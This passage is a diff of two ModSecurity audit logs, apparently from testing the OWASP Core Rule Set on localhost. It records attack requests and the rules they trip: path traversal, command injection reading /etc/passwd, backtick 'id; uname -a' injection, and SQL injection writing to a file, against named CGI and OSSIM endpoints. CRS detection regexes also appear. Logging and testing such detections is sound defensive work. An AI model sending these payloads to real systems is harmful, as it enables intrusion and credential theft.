[unique_id "1652043650"] [ref "o39,4v4,70"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043650"] [ref "o39,4v4,70"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewappletfsa.cgi?seqid=../../../../home/dna/spool/.pfile"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043650"] [ref "o39,4v4,70o39,4v4,70t:cmdLine"]
-ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `15' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 15)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652043650"] [ref ""]
+---BkLyyPKt---H--
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)(?:\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5 (400 characters omitted)' against variable `REQUEST_URI_RAW' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "29"] [id "930100"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/DIR_TRAVERSAL"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o39,4v4,70"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o39,4v4,70"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:^|[\\/])\.\.(?:[\\/]|$)' against variable `REQUEST_URI' (Value: `/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "51"] [id "930110"] [rev ""] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /cgi-bin/dna/viewappletfsa.cgi?seqid=../../../../home/dna/spool/.pfile"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref "o39,4v4,70o39,4v4,70t:cmdLine"]
+ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `15' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 15)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/cgi-bin/dna/viewAppletFsa.cgi"] [unique_id "1652108236"] [ref ""]
 
----ND7JG8DS---I--
+---BkLyyPKt---I--
 
----ND7JG8DS---J--
+---BkLyyPKt---J--
 
----ND7JG8DS---Z--
+---BkLyyPKt---Z--
 
----lk1Q41ri---A--
-[08/May/2022:23:00:51 +0200] 1652043651 127.0.0.1 12345 127.0.0.1 80
----lk1Q41ri---B--
+---1JIwquXS---A--
+[09/May/2022:16:57:17 +0200] 1652108237 127.0.0.1 12345 127.0.0.1 80
+---1JIwquXS---B--
 GET /ping.cgi?IPAddr1=12&IPAddr3=12&IPAddr2=12&ping=Ping&IPAddr4=12&ping_IPAddr=12.12.12.12%3B+cat%20/etc/passwd HTTP/1.1
 Host: localhost
 User-Agent: msc_process_uri
 Accept: */*
 
----lk1Q41ri---D--
+---1JIwquXS---D--
 
----lk1Q41ri---F--
+---1JIwquXS---F--
 HTTP/1.1 200
 
----lk1Q41ri---H--
-ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `lfi-os-files.data' against variable `ARGS:ping_IPAddr' (Value: `12.12.12.12; cat /etc/passwd' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "76"] [id "930120"] [rev ""] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:ping_IPAddr: 12.12.12.12; cat /etc/passwd"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/FILE_INJECTION"] [tag "WASCTC/WASC-33"] [tag "OWASP_TOP_10/A4"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652043651"] [ref "o18,10v80,28t:utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5210 characters omitted)' against variable `ARGS:ping_IPAddr' (Value: `12.12.12.12; cat /etc/passwd' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "102"] [id "932100"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: ; cat /etc/passwd found within ARGS:ping_IPAddr: 12.12.12.12; cat /etc/passwd"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652043651"] [ref "o11,17v80,28"]
-ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `unix-shell.data' against variable `ARGS:ping_IPAddr' (Value: `12.12.12.12; cat /etc/passwd' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "488"] [id "932160"] [rev ""] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:ping_IPAddr: 12.12.12.12 cat/etc/passwd"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652043651"] [ref "o16,10v80,28t:urlDecodeUni,t:cmdLine,t:normalizePath,t:lowercase"]
-ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `15' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 15)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652043651"] [ref ""]
+---1JIwquXS---H--
+ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `lfi-os-files.data' against variable `ARGS:ping_IPAddr' (Value: `12.12.12.12; cat /etc/passwd' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "76"] [id "930120"] [rev ""] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:ping_IPAddr: 12.12.12.12; cat /etc/passwd"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/FILE_INJECTION"] [tag "WASCTC/WASC-33"] [tag "OWASP_TOP_10/A4"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652108237"] [ref "o18,10v80,28t:utf8toUnicode,t:urlDecodeUni,t:normalizePathWin,t:lowercase"]
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5210 characters omitted)' against variable `ARGS:ping_IPAddr' (Value: `12.12.12.12; cat /etc/passwd' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "102"] [id "932100"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: ; cat /etc/passwd found within ARGS:ping_IPAddr: 12.12.12.12; cat /etc/passwd"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652108237"] [ref "o11,17v80,28"]
+ModSecurity: Warning. Matched "Operator `PmFromFile' with parameter `unix-shell.data' against variable `ARGS:ping_IPAddr' (Value: `12.12.12.12; cat /etc/passwd' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "488"] [id "932160"] [rev ""] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:ping_IPAddr: 12.12.12.12 cat/etc/passwd"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652108237"] [ref "o16,10v80,28t:urlDecodeUni,t:cmdLine,t:normalizePath,t:lowercase"]
+ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `15' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 15)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652108237"] [ref ""]
 
----lk1Q41ri---I--
+---1JIwquXS---I--
 
----lk1Q41ri---J--
+---1JIwquXS---J--
 
----lk1Q41ri---Z--
+---1JIwquXS---Z--
 
----Ttt5TexG---A--
-[08/May/2022:23:00:52 +0200] 1652043652 127.0.0.1 12345 127.0.0.1 80
----Ttt5TexG---B--
+---1JIwquXS---A--
+[09/May/2022:16:57:17 +0200] 1652108237 127.0.0.1 12345 127.0.0.1 80
+---1JIwquXS---B--
 GET /ping.cgi?IPAddr1=12&IPAddr3=12&IPAddr2=12&ping=Ping&IPAddr4=12&ping_IPAddr=12.12.12.12%26+ls%20/etc/ HTTP/1.1
 Host: localhost
 User-Agent: msc_process_uri
 Accept: */*
 
----Ttt5TexG---D--
+---1JIwquXS---D--
 
----Ttt5TexG---F--
+---1JIwquXS---F--
 HTTP/1.1 200
 
----Ttt5TexG---H--
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5210 characters omitted)' against variable `ARGS:ping_IPAddr' (Value: `12.12.12.12& ls /etc/' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "102"] [id "932100"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: & ls found within ARGS:ping_IPAddr: 12.12.12.12& ls /etc/"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652043652"] [ref "o11,4v80,21"]
-ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `5' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652043652"] [ref ""]
+---1JIwquXS---H--
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5210 characters omitted)' against variable `ARGS:ping_IPAddr' (Value: `12.12.12.12& ls /etc/' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "102"] [id "932100"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: & ls found within ARGS:ping_IPAddr: 12.12.12.12& ls /etc/"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652108237"] [ref "o11,4v80,21"]
+ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `5' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/ping.cgi"] [unique_id "1652108237"] [ref ""]
 
----Ttt5TexG---I--
+---1JIwquXS---I--
 
----Ttt5TexG---J--
+---1JIwquXS---J--
 
----Ttt5TexG---Z--
+---1JIwquXS---Z--
 
----u91iCtZ1---A--
-[08/May/2022:23:00:54 +0200] 1652043654 127.0.0.1 12345 127.0.0.1 80
----u91iCtZ1---B--
+---1oRUsldr---A--
+[09/May/2022:16:57:18 +0200] 1652108238 127.0.0.1 12345 127.0.0.1 80
+---1oRUsldr---B--
 GET /ossim/dashboard/sections/widgets/data/gauge.php?&type=alarm&wtype=blah&asset=1&height=1&value=a%3A1%3A%7Bs%3A4%3A%22type%22%3Bs%3A67%3A%22pass+from+users+INTO+OUTFILE+%27%2Ftmp%2F1.1.1.1_pass_tshark.pcap%27--+-%22%3B%7D HTTP/1.1
 Host: localhost
 User-Agent: msc_process_uri
 Accept: */*
 
----u91iCtZ1---D--
+---1oRUsldr---D--
 
----u91iCtZ1---F--
+---1oRUsldr---F--
 HTTP/1.1 200
 
----u91iCtZ1---H--
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i:(?:[\"'`](?:;?\s*?(?:having|select|union)\b\s*?[^\s]|\s*?!\s*?[\"'`\w])|(?:c(?:onnection_id|urrent_user)|database)\s*?\([^\)]*?|u(?:nion(?:[\w(\s]*?select| select @)|ser\s*?\([^\)]*?)|s(?:chema\s* (165 characters omitted)' against variable `ARGS:value' (Value: `a:1:{s:4:"type";s:67:"pass from users INTO OUTFILE '/tmp/1.1.1.1_pass_tshark.pcap'-- -";}' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "169"] [id "942190"] [rev ""] [msg "Detects MSSQL code execution and information gathering attempts"] [data "Matched Data: INTO OUTFILE ' found within ARGS:value: a:1:{s:4:"type";s:67:"pass from users INTO OUTFILE '/tmp/1.1.1.1_pass_tshark.pcap'-- -";}"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/SQL_INJECTION"] [tag "WASCTC/WASC-19"] [tag "OWASP_TOP_10/A1"] [tag "OWASP_AppSensor/CIE1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/ossim/dashboard/sections/widgets/data/gauge.php"] [unique_id "1652043654"] [ref "o38,14v99,89t:urlDecodeUni"]
-ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `5' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/ossim/dashboard/sections/widgets/data/gauge.php"] [unique_id "1652043654"] [ref ""]
+---1oRUsldr---H--
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i:(?:[\"'`](?:;?\s*?(?:having|select|union)\b\s*?[^\s]|\s*?!\s*?[\"'`\w])|(?:c(?:onnection_id|urrent_user)|database)\s*?\([^\)]*?|u(?:nion(?:[\w(\s]*?select| select @)|ser\s*?\([^\)]*?)|s(?:chema\s* (165 characters omitted)' against variable `ARGS:value' (Value: `a:1:{s:4:"type";s:67:"pass from users INTO OUTFILE '/tmp/1.1.1.1_pass_tshark.pcap'-- -";}' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "169"] [id "942190"] [rev ""] [msg "Detects MSSQL code execution and information gathering attempts"] [data "Matched Data: INTO OUTFILE ' found within ARGS:value: a:1:{s:4:"type";s:67:"pass from users INTO OUTFILE '/tmp/1.1.1.1_pass_tshark.pcap'-- -";}"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/SQL_INJECTION"] [tag "WASCTC/WASC-19"] [tag "OWASP_TOP_10/A1"] [tag "OWASP_AppSensor/CIE1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/ossim/dashboard/sections/widgets/data/gauge.php"] [unique_id "1652108238"] [ref "o38,14v99,89t:urlDecodeUni"]
+ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `5' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/ossim/dashboard/sections/widgets/data/gauge.php"] [unique_id "1652108238"] [ref ""]
 
----u91iCtZ1---I--
+---1oRUsldr---I--
 
----u91iCtZ1---J--
+---1oRUsldr---J--
 
----u91iCtZ1---Z--
+---1oRUsldr---Z--
 
----eKNQy68r---A--
-[08/May/2022:23:00:55 +0200] 1652043655 127.0.0.1 12345 127.0.0.1 80
----eKNQy68r---B--
+---1oRUsldr---A--
+[09/May/2022:16:57:18 +0200] 1652108238 127.0.0.1 12345 127.0.0.1 80
+---1oRUsldr---B--
 GET /cgi-bin/userConfig.cgi?func=cloudPersonalSmtp&sid=SIDVALUE&hash=`(echo;id;uname%20-a)>%262` HTTP/1.1
 Host: localhost
 User-Agent: msc_process_uri
 Accept: */*
 
----eKNQy68r---D--
+---1oRUsldr---D--
 
----eKNQy68r---F--
+---1oRUsldr---F--
 HTTP/1.1 200
 
----eKNQy68r---H--
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5275 characters omitted)' against variable `ARGS:hash' (Value: ``(echo;id;uname -a)>&2`' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "139"] [id "932105"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: ;uname found within ARGS:hash: `(echo;id;uname -a)>&2`"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/cgi-bin/userConfig.cgi"] [unique_id "1652043655"] [ref "o9,6v69,23"]
-ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)(?:;|\{|\||\|\||&|&&|\n|\r|`)\s*[\(,@\'\"\s]*(?:[\w'\"\./]+/|[\\\\'\"\^]*\w[\\\\'\"\^]*:.*\\\\|[\^\.\w '\"/\\\\]*\\\\)?[\"\^]*(?:m[\"\^]*(?:y[\"\^]*s[\"\^]*q[\"\^]*l(?:[\"\^]*(?:d[\"\^]*u[\"\^]*m[ (4978 characters omitted)' against variable `ARGS:hash' (Value: ``(echo;id;uname -a)>&2`' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "237"] [id "932110"] [rev ""] [msg "Remote Command Execution: Windows Command Injection"] [data "Matched Data: `(echo found within ARGS:hash: `(echo;id;uname -a)>&2`"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-windows"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/cgi-bin/userConfig.cgi"] [unique_id "1652043655"] [ref "o0,6v69,23"]
-ModSecurity: Warning. Matched "Operator `Ge' with parameter `5' against variable `TX:ANOMALY_SCORE' (Value: `10' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "79"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 10)"] [data ""] [severity "2"] [ver ""] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/cgi-bin/userConfig.cgi"] [unique_id "1652043655"] [ref ""]
+---1oRUsldr---H--
+ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?:;|\{|\||\|\||&|&&|\n|\r|\$\(|\$\(\(|`|\${|<\(|>\(|\(\s*\))\s*(?:{|\s*\(\s*|\w+=(?:[^\s]*|\$.*|\$.*|<.*|>.*|\'.*\'|\".*\")\s+|!\s*|\$)*\s*(?:'|\")*(?:[\?\*\[\]\(\)\-\|+\w'\"\./\\\\]+/)?[\\\\'\"]*(?: (5275 characters omitted)' against variable `ARGS:hash' (Value: ``(echo;id;uname -a)>&2`' ) [file "httpd/owasp-modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "139"] [id "932105"] [rev ""] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: ;uname found within ARGS:hash: `(echo;id;uname -a)>&2`"] [severity "2"] [ver "OWASP_CRS/3.2.0"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION"] [tag "WASCTC/WASC-31"] [tag "OWASP_TOP_10/A1"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/cgi-bin/userConfig.cgi"] [unique_id "1652108238"] [ref "o9,6v69,23"]
